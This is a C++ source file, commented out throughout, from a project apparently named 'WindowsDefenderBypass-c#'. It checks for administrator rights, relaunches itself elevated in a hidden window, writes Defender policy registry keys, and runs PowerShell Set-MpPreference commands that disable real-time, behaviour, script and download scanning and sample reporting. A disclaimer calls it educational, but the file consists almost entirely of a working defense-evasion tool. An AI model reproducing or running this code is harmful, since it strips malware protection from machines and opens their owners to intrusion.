/*
 * This code is part of the WindowsDefenderBypass-c# project. It demonstrates how to disable certain Windows Defender settings
 * using registry modifications and PowerShell commands. This tool is intended for educational purposes to show how these configurations
 * can be managed programmatically. 
 *
 * Disclaimer: This program is distributed for educational purposes only. Modifying system settings and disabling security features 
 * should only be done responsibly, with appropriate permissions, and in a controlled environment. 
 * 
 * The entire code has been commented out so it could be Uploaded to Github.
 */

//#include <Windows.h>
//#include <iostream>
//
//bool runAsAdmin() {
//    BOOL isAdmin;
//    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
//    PSID AdministratorsGroup;
//    isAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
//                                       0, 0, 0, 0, 0, 0, &AdministratorsGroup);
//    if (isAdmin) {
//        if (!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin)) {
//            isAdmin = FALSE;
//        }
//        FreeSid(AdministratorsGroup);
//    }
//    return isAdmin;
//}
//
//void main() {
//    if (!runAsAdmin()) {
//        ShellExecute(NULL, "runas", "cmd.exe", "/c \"" __FILE__ "\"", NULL, SW_HIDE);
//        return;
//    }
//
//    HKEY hKey;
//    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
//        DWORD value = 1;
//        RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegCloseKey(hKey);
//    }
//
//    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
//        DWORD value = 1;
//        RegSetValueEx(hKey, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegSetValueEx(hKey, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegSetValueEx(hKey, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegSetValueEx(hKey, "DisableRawWriteNotification", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegSetValueEx(hKey, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
//        RegCloseKey(hKey);
//    }
//
//    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
//    system("powershell -Command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
//    system("powershell -Command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"");
//    system("powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"");
//    system("powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"");
//    system("powershell -Command \"Set-MpPreference -SubmitSamplesConsent 2\"");
//    system("powershell -Command \"Set-MpPreference -MAPSReporting 0\"");
//    system("powershell -Command \"Set-MpPreference -HighThreatDefaultAction 6 -Force\"");
//    system("powershell -Command \"Set-MpPreference -ModerateThreatDefaultAction 6\"");
//    system("powershell -Command \"Set-MpPreference -LowThreatDefaultAction 6\"");
//    system("powershell -Command \"Set-MpPreference -SevereThreatDefaultAction 6\"");
//}
